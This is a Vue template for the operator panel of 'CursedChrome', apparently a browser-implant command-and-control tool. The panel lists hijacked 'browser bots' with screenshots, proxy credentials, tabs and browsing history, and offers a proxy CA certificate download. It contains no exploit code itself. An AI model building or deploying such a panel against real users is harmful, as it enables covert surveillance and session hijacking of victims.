<template>
  <div v-if="user.is_authenticated">
    <!-- Bots panel -->
    <b-card-group deck>
      <b-card
        border-variant="primary"
        header="CursedChrome Bots"
        header-bg-variant="primary"
        header-text-variant="white"
        align="center"
      >
        <b-card-text>
          <h1>Connected Browser Bot(s)</h1>
          <table class="table table-striped">
            <thead>
              <tr>
                <th scope="col">Capture</th>
                <th scope="col">Name</th>
                <th scope="col">HTTP Proxy Credentials</th>
                <th scope="col">Online?</th>
                <th scope="col">Tabs/History</th>
                <th scope="col">CurrentTab</th>
                <th scope="col">Options</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="bot in Object.values(bots_map)" v-bind:key="bot.id">
                <td scope="row" style="vertical-align: middle">
                  <b-img
                    :src="`/api/v1/bots/image/${bot.id}`"
                    alt="Image"
                    width="160"
                    height="90"
                    fluid
                  ></b-img>
                </td>
                <td scope="row" style="vertical-align: middle">
                  {{ bot.name }}
                  <b-icon
                    v-if="bot.state == 'locked'"
                    icon="lock-fill"
                    class="rounded bg-primary p-1"
                    variant="light"
                  ></b-icon>
                  <b-icon
                    v-else
                    icon="unlock-fill"
                    class="rounded bg-danger p-1"
                    variant="light"
                  ></b-icon>
                </td>
                <td style="vertical-align: middle">
                  <div>
                    <div class="input-group" style="width: 100%">
                      <div class="input-group-prepend">
                        <span class="input-group-text" style="min-width: 100px"
                          >Username</span
                        >
                      </div>
                      <input
                        type="text"
                        class="form-control"
                        placeholder="Please wait..."
                        v-bind:value="bot.proxy_username"
                      />
                      <div class="input-group-append">
                        <span
                          class="input-group-text copy-element"
                          v-bind:data-clipboard-text="bot.proxy_username"
                          v-on:click="copy_toast"
                        >
                          <font-awesome-icon
                            :icon="['fas', 'clipboard']"
                            class="icon alt mr-1 ml-1"
                        /></span>
                      </div>
                    </div>
                    <div class="input-group" style="width: 100%">
                      <div class="input-group-prepend">
                        <span class="input-group-text" style="min-width: 100px"
                          >Password</span
                        >
                      </div>
                      <input
                        type="text"
                        class="form-control"
                        placeholder="Please wait..."
                        v-bind:value="bot.proxy_password"
                      />
                      <div
                        class="input-group-append copy-element"
                        v-bind:data-clipboard-text="bot.proxy_password"
                        v-on:click="copy_toast"
                      >
                        <span class="input-group-text">
                          <font-awesome-icon
                            :icon="['fas', 'clipboard']"
                            class="icon alt mr-1 ml-1"
                        /></span>
                      </div>
                    </div>
                  </div>
                </td>
                <td
                  class="table-success online-col"
                  style="vertical-align: middle"
                  v-if="bot.is_online"
                >
                  <span class="online-symbol">
                    <font-awesome-icon
                      :icon="['fas', 'check-circle']"
                      class="icon alt mr-1 ml-1"
                    />
                  </span>
                </td>
                <td
                  class="online-col table-danger p-0"
                  style="vertical-align: middle"
                  v-if="!bot.is_online"
                >
                  <span class="offline-symbol">
                    <font-awesome-icon
                      :icon="['fas', 'times-circle']"
                      class="icon alt mr-1 ml-1"
                    />
                  </span>
                  <span>{{ convertToCurrentTimeZone(bot.last_online) }}</span>
                </td>
                <td>{{ bot.tabs }} / {{ bot.history }}</td>
                <td>
                  <b-link :href="bot.current_tab.url" target="”_blank”"
                    >{{ bot.current_tab.title }}
                  </b-link>
                </td>

                <td style="vertical-align: middle">
                  <b-button-group vertical>
                    <b-button
                      variant="primary"
                      v-on:click="bot_open_options(bot.id)"
                    >
                      <font-awesome-icon
                        :icon="['fas', 'cog']"
                        class="icon alt mr-1 ml-1"
                      />
                      Options
                    </b-button>
                    <b-button variant="danger" v-on:click="delete_bot(bot.id)">
                      <font-awesome-icon
                        :icon="['fas', 'trash']"
                        class="icon alt mr-1 ml-1"
                      />
                      Delete
                    </b-button>
                  </b-button-group>
                </td>
              </tr>
            </tbody>
          </table>
        </b-card-text>
      </b-card>
    </b-card-group>
    <!-- Options panel -->
    <b-card-group deck class="mt-4">
      <b-card
        border-variant="info"
        header="Options"
        header-bg-variant="info"
        header-text-variant="white"
        align="center"
      >
        <b-card-text>
          <b-button variant="info" v-on:click="download_ca">
            <font-awesome-icon
              :icon="['fas', 'download']"
              class="icon alt mr-1 ml-1"
            />
            Download HTTPS Proxy CA Certificate
            <i>(Required to Use HTTP Proxy)</i>
          </b-button>
        </b-card-text>
      </b-card>
    </b-card-group>
    <!-- Bot options modal -->
    <div v-if="id_bot_selected">
      <b-modal
        id="bot_options_modal"
        title="Bot Options & Info"
        ok-only
        ok-variant="secondary"
        ok-title="Close"
        size="xl"
        lazy
        scrollable
        @hidden="reset_options_modal"
      >
        <p v-if="bots_map[id_bot_selected].current_tab">
          <a :href="bots_map[id_bot_selected].current_tab.url" target="”_blank”"
            >{{ bots_map[id_bot_selected].current_tab.title }}
          </a>
        </p>
        <p>
          <b-img-lazy
            center
            thumbnail
            fluid
            :src="`/api/v1/bots/image/${id_bot_selected}`"
            width="800"
            height="450"
          ></b-img-lazy>
        </p>
        <p>
          This bot has a User-Agent of
          <code>{{ bots_map[id_bot_selected].user_agent }}</code> and was first
          seen
          {{
            bots_map[id_bot_selected].createdAt
              | moment("MMMM Do YYYY, h:mm:ss a")
          }}.
        </p>

        <p>
          Bot UUID is <code>{{ bots_map[id_bot_selected].id }}</code>
        </p>
        <p>
          <b-button-group v-if="id_bot_selected">
            <b-button
              variant="success"
              v-if="bots_map[id_bot_selected].tabs"
              v-on:click="tabs_tab_show = !tabs_tab_show"
              v-b-toggle.sidebar-tabs
              >Tabs[{{ bots_map[id_bot_selected].tabs.length }}]</b-button
            >
            <b-button
              variant="warning"
              v-if="bots_map[id_bot_selected].history"
              v-on:click="history_tab_show = !history_tab_show"
              v-b-toggle.sidebar-history
              >History[{{ bots_map[id_bot_selected].history.length }}]</b-button
            >
          </b-button-group>

          <!-- TABS -->
        </p>

        <p><Tabs /></p>
      </b-modal>
    </div>
    <!-- Update user password modal -->
    <div>
      <b-modal
        id="update_password_modal"
        title="Update Account Password"
        ok-only
        ok-variant="secondary"
        ok-title="Never mind"
      >
        <p>Enter your new password below</p>
        <div class="input-group mb-2">
          <div class="input-group-prepend">
            <span class="input-group-text">New Password</span>
          </div>
          <input
            type="password"
            class="form-control"
            placeholder="******"
            v-model="update_password.new_password"
            autofocus
          />
        </div>
        <div class="input-group mb-2">
          <div class="input-group-prepend">
            <span class="input-group-text">New Password (Again)</span>
          </div>
          <input
            type="password"
            class="form-control"
            placeholder="******"
            v-model="update_password.new_password_again"
            autofocus
          />
        </div>
        <b-alert
          class="text-center"
          show
          variant="danger"
          v-if="!change_passwords_match"
        >
          <font-awesome-icon
            :icon="['fas', 'exclamation-circle']"
            class="icon alt mr-1 ml-1"
          />
          Both passwords do not match, double check your inputs.
        </b-alert>
        <b-button
          variant="primary btn-block"
          v-bind:disabled="!change_passwords_match"
          v-on:click="update_user_password"
        >
          <font-awesome-icon
            :icon="['fas', 'key']"
            class="icon alt mr-1 ml-1"
          />
          Change Password
        </b-button>
      </b-modal>
    </div>
  </div>
</template>
